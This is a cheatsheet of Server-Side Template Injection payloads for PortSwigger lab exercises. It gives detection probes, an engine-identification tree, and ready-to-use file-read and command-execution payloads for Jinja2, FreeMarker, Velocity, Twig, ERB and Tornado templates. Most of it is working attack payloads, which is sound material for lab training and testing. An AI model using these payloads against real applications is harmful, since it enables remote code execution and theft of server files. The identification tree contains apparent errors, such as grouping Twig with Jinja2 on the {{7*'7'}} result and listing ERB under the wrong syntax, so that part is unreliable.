# 🎯 SSTI (Server-Side Template Injection) Cheatsheet

Complete detection vectors, template engine identification methodologies, and RCE / file reading payloads for Server-Side Template Injection labs in PortSwigger Web Security Academy.

---

## 📌 1. Polyglot & Detection Vectors

Inject mathematical expressions into input fields, headers, or query parameters to verify template evaluation.

* **Standard Detection Payloads:**
<pre><code>{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}</code></pre>

> **Verification:** If the server output reflects `49` instead of literal string input, SSTI is confirmed.

---

## 📌 2. Template Engine Identification Tree

Follow the decision tree by evaluating responses to specific mathematical expressions:

1. Inject `${7*7}`
   * Returns `49` -> Test `a{*comment*}b` vs `${"z".join("ab")}` (Smarty vs Mavel/Spring)
   * Returns `${7*7}` -> Inject `{{7*7}}`
2. Inject `{{7*7}}`
   * Returns `49` -> Inject `{{7*'7'}}`
     * Returns `7777777` -> **Jinja2** (Python) or **Twig** (PHP)
     * Returns `49` -> **Tornado** (Python), **ERB** (Ruby), or **Velocity** (Java)
3. Inject `<%= 7*7 %>`
   * Returns `49` -> **ERB** (Ruby)

---

## 📌 3. Engine-Specific Payloads

### Jinja2 (Python)

#### File Read
Access subclasses via Python MRO (Method Resolution Order) chain to invoke file reading classes.

* **Payload 1 (MRO Indexing):**
  <pre><code>{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}</code></pre>

* **Payload 2 (Config Dictionary):**
  <pre><code>{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}</code></pre>

#### Remote Code Execution (RCE)
Leverage global context objects to execute OS commands via `os.popen()`.

<pre><code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}</code></pre>

---

### FreeMarker (Java)

Execute system commands using FreeMarker's built-in `Execute` class utility.

<pre><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;
${ ex("cat /home/carlos/secret") }</code></pre>

---

### Velocity (Java)

Reflection-based payload that uses Java runtime objects to execute commands and process standard input streams.

<pre><code>#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end</code></pre>

---

### Twig (PHP)

Exploit undefined filter callbacks or built-in system filters to execute shell commands.

* **Payload 1 (Filter Callback Register):**
  <pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}</code></pre>

* **Payload 2 (System Pipe Filter):**
  <pre><code>{{['cat /home/carlos/secret']|filter('system')}}</code></pre>

---

### ERB (Ruby)

Execute system commands via Ruby backticks or standard `system()` execution.

<pre><code>&lt;%= system('cat /home/carlos/secret') %&gt;
&lt;%= `cat /home/carlos/secret` %&gt;</code></pre>

---

### Tornado (Python)

Import `os` module directly within template syntax to read system files.

<pre><code>{% import os %}
{{ os.popen('cat /home/carlos/secret').read() }}</code></pre>

---

## 🗄️ SSTI Quick Reference

| Template Engine | Language | Detection Probe | Primary RCE / Exfiltration Primitive |
| :--- | :--- | :--- | :--- |
| **Jinja2** | Python | `{{7*'7'}}` -> `7777777` | `self._TemplateReference__context...os.popen()` |
| **Twig** | PHP | `{{7*'7'}}` -> `7777777` | `{{['id']\|filter('system')}}` |
| **FreeMarker** | Java | `${7*7}` -> `49` | `<#assign ex="freemarker...Execute"?new()>` |
| **Velocity** | Java | `$class.forName(...)` | Java Reflection `Runtime.getRuntime().exec()` |
| **ERB** | Ruby | `<%= 7*7 %>` -> `49` | `<%= system('id') %>` |
| **Tornado** | Python | `{{7*7}}` -> `49` | `{% import os %}{{ os.popen(...) }}` |
